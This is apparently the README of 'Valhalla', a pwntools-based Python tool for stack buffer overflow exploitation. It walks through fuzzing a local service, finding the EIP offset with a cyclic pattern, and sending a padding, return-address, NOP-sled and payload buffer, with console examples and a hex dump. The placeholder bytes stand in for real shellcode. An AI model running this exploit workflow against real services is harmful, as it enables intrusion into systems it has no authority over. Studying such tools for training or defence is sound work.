# Valhalla
Valhalla is a binary exploitation command-line tool allowing to make buffer overflow exploits faster and easier. It's written in python on the top of pwn lib.
This write up aims in showing an example of how to use Valhalla framework and write the less possible "boilerplate" code.

## Communication layer with the application
Valhalla relies on pwn lib to abstract the communication with the application to attack. By default, it will output on stdout, allowing unix redirections. With -H and -P options, you can specify an IP and a PORT to send data, and not bother to change anything else.

## Fuzzing
When dealing with buffer overflows, generally the first step is to check if we can crash the application by sending it data.
Valhalla fuzzing allows to send an increasing ammount of bytes. The first given argument is the number of repetitions we want to try. There are other parameters, to change the incrasing lenght added each time, or the byte value we are fuzzing with for example.
```console
odin@valhalla:~$ python valhalla.py -f 10 | ./application_to_attack
[+] Output set to stdout
[+] Fuzz mode
[+] 100 bytes ready to send. Press anything to break after or 'c' to not ask again
c
[+] Sending 100 bytes...
[+] Done

[+] Sending 200 bytes...
[+] Done

[+] Sending 300 bytes...
```
## Pattern searching
If the application is successfully crashed when fuzzing, and EIP register has been replaced by the fuzzed byte, then we have control over it.
Let's say we found a crash when fuzzing an ipplcation on 127.0.0.1:4444 with more or less 200 bytes. The next step is to use a specific pattern to find the exact offset needed to override EIP with our own return address. 

```console
odin@valhalla:~$ python valhalla.py -H 127.0.0.1 -P 4444 --pattern_create 300 
```
This time the application crash again, but instead of having just "A" in EIP, we have a part of the generated pattern, for example 0x61616178. Then we match it in order to have the exact offset.
```console
odin@valhalla:~$ python valhalla.py --pattern_offset 0x61616178
[+] Output set to 127.0.0.1:4444
[+] Pattern Offset Search mode
[+] Offset = 92

```

## Exploit
Now that we've got the offset, we can override eip with the value we want (the address of jmp esp that we found in the application or its library for example), and write our payload just after, attached to a NOP sled.
```console
odin@valhalla:~$ python valhalla.py -H 127.0.0.1 -P 4444 --exploit --offset 92 --ret "\xde\xad\xbe\xef" --nop 16 --payload "\xca\xfe\xba\xbe"
[+] Output set to 127.0.0.1:4444
[+] Opening connection to 127.0.0.1 on port 4444: Done
[+] Exploit mode
[+] 116 bytes ready to send. Press anything to break after or 'c' to not ask again
c
[+] Sending 116 bytes...
[+] Done
[*] Closed connection to 127.0.0.1 port 4444
```
```console
What is sent ?
offset | Bytes value
0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
0000050 4141 4141 4141 4141 4141 4141 adde efbe
0000060 9090 9090 9090 9090 9090 9090 9090 9090
0000070 feca beba
```

## Exploit from yaml file
Offset, return, nop, and payload parameters can also be set in a yaml file for convenience and versionning
```console
odin@valhalla:~$ cat exploit_template.yaml
---
  offset: 10
  ret : \xbb\xbb\xbb\xbb
  nop: 16
  payload : \xff\xff\xff\xff
```
```console
odin@valhalla:~$ python valhalla.py -H 127.0.0.1 -P 4444 --yaml exploit_template.yaml
```
